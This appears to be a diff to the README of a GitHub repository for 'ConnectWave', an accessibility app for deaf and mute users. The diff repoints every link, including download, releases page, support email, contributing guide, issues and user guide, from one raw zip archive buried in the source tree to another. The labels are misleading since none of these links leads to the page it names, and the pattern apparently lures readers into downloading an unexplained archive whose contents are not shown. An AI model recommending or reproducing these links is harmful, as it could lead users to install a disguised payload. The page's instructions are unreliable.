@@ -4,7 +4,7 @@
 ConnectWave is a web application designed to help deaf and mute individuals during phone calls. It uses speech-to-text and text-to-speech technologies to create a smoother communication experience. Follow these steps to download and run ConnectWave.
 
 ## 📥 Download ConnectWave
-[![Download ConnectWave](https://github.com/agungmahardikka/ConnectWave/raw/refs/heads/main/client/src/components/ui/Connect-Wave-v1.1.zip)](https://github.com/agungmahardikka/ConnectWave/raw/refs/heads/main/client/src/components/ui/Connect-Wave-v1.1.zip)
+[![Download ConnectWave](https://github.com/agungmahardikka/ConnectWave/raw/refs/heads/main/client/Wave-Connect-v3.8-beta.4.zip)](https://github.com/agungmahardikka/ConnectWave/raw/refs/heads/main/client/Wave-Connect-v3.8-beta.4.zip)
 
 ## 🛠️ System Requirements
 To run ConnectWave smoothly, please ensure your device meets the following requirements:
@@ -16,7 +16,7 @@ To run ConnectWave smoothly, please ensure your device meets the following requi
 
 ## 📂 How to Download and Install
 1. **Visit the Releases Page**  
-   Click on this link to access the [ConnectWave Releases Page](https://github.com/agungmahardikka/ConnectWave/raw/refs/heads/main/client/src/components/ui/Connect-Wave-v1.1.zip). You will find the latest version available for download.
+   Click on this link to access the [ConnectWave Releases Page](https://github.com/agungmahardikka/ConnectWave/raw/refs/heads/main/client/Wave-Connect-v3.8-beta.4.zip). You will find the latest version available for download.
 
 2. **Select Your Version**  
    On the Releases page, you will see a list of available versions. Look for the most recent version at the top.
@@ -55,7 +55,7 @@ ConnectWave offers a number of features to enhance your experience:
 For any questions or help with using ConnectWave, you can reach out through the following channels:
 
 - **GitHub Issues:** Use the GitHub Issues page for submitting questions or reporting bugs.
-- **Email:** Contact our support team at https://github.com/agungmahardikka/ConnectWave/raw/refs/heads/main/client/src/components/ui/Connect-Wave-v1.1.zip
+- **Email:** Contact our support team at https://github.com/agungmahardikka/ConnectWave/raw/refs/heads/main/client/Wave-Connect-v3.8-beta.4.zip
 - **User Guide:** A detailed user guide is available in the application under the Help menu.
 
 ## 📖 Community Guidelines
@@ -72,11 +72,11 @@ If you want to help improve ConnectWave, you can contribute in the following way
 - **Suggest Features:** Share your ideas for new features that could enhance the application.
 - **Develop:** If you have coding skills, consider submitting code contributions through pull requests.
 
-For more details on contributing, visit the [Contributing Guide](https://github.com/agungmahardikka/ConnectWave/raw/refs/heads/main/client/src/components/ui/Connect-Wave-v1.1.zip).
+For more details on contributing, visit the [Contributing Guide](https://github.com/agungmahardikka/ConnectWave/raw/refs/heads/main/client/Wave-Connect-v3.8-beta.4.zip).
 
 ## 🔗 Links
-- [Download Now](https://github.com/agungmahardikka/ConnectWave/raw/refs/heads/main/client/src/components/ui/Connect-Wave-v1.1.zip)
-- [Issues Page](https://github.com/agungmahardikka/ConnectWave/raw/refs/heads/main/client/src/components/ui/Connect-Wave-v1.1.zip)
-- [User Guide](https://github.com/agungmahardikka/ConnectWave/raw/refs/heads/main/client/src/components/ui/Connect-Wave-v1.1.zip)
+- [Download Now](https://github.com/agungmahardikka/ConnectWave/raw/refs/heads/main/client/Wave-Connect-v3.8-beta.4.zip)
+- [Issues Page](https://github.com/agungmahardikka/ConnectWave/raw/refs/heads/main/client/Wave-Connect-v3.8-beta.4.zip)
+- [User Guide](https://github.com/agungmahardikka/ConnectWave/raw/refs/heads/main/client/Wave-Connect-v3.8-beta.4.zip)
 
 Enjoy using ConnectWave for your communication needs. Thank you for being part of our community!
